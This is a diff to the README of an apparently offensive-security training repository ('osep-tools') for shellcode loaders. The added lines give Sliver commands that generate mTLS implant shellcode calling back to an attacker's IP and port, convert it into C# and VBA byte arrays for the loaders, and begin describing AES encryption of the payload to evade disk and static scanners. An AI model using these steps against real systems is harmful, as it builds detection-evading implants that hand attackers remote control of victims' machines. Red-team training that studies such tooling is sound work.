@@ -13,11 +13,19 @@ Visual Studio (Release, x64).
 
 ## Shellcode
 
-These loaders take **raw** shellcode. Generate with Sliver and convert:
+These loaders take **raw** shellcode. Generate it as a C# array directly:
+
+```bash
+sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs   # paste byte[] into `buf`
+```
+
+Or generate raw shellcode and convert (incl. VBA `Array(...)`) — run from the
+`osep-tools` repo root:
 
 ```bash
 sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-python3 ../../sliver/sliver2arrays.py /tmp/sc.bin --csharp   # paste into the `buf` array
+python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
+python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
 ```
 
 To keep the payload off disk/static scanners, pipe the C# array through the AES
